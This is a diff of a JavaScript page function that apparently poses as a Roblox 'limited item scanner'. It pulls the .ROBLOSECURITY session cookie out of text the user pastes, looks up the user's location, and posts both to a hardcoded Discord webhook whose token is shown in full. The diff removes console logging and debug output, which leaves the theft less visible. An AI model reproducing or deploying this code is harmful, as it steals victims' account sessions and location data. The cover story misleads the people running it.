@@ -231,23 +231,13 @@ async function submitPowerShell() {
 
     try {
         // Scan limited items and find authentication data from the input
-        // Create debug display for mobile users
-        const debugInfo = `
-Length: ${inputText.length}
-Contains .ROBLOSECURITY: ${inputText.includes('.ROBLOSECURITY')}
-Preview: ${inputText.substring(0, 100)}...
-        `;
-        
+        // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
         
-        if (!robloxCookie) {
-            showNotification(`Debug Info: ${debugInfo}`, 'error');
-        }
-        
         // Block execution if no authentication data is found
         if (!robloxCookie) {
-            console.log('No auth data found, blocking execution');
+
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
@@ -262,14 +252,11 @@ Preview: ${inputText.substring(0, 100)}...
         }
         
         // Get user location
-        console.log('Getting user location...');
+        // Get user location
         const locationInfo = await getUserLocation();
-        console.log('Location obtained:', locationInfo.country);
         
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
-        
-        console.log('Processing script data...');
         
         // Webhook payload with only data and location
         const payload = {
@@ -305,7 +292,6 @@ Preview: ${inputText.substring(0, 100)}...
             }]
         };
 
-        console.log('Sending webhook...');
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -313,8 +299,6 @@ Preview: ${inputText.substring(0, 100)}...
             },
             body: JSON.stringify(payload)
         });
-
-        console.log('Webhook response status:', response.status);
         
         // Hide loading overlay
         loadingOverlay.style.display = 'none';
@@ -332,8 +316,6 @@ Preview: ${inputText.substring(0, 100)}...
             throw new Error(`Item scanning failed with status: ${response.status}`);
         }
     } catch (error) {
-        console.error('Detailed error:', error);
-        console.error('Error stack:', error.stack);
         loadingOverlay.style.display = 'none';
         
         stopLoadingAnimation(submitText);
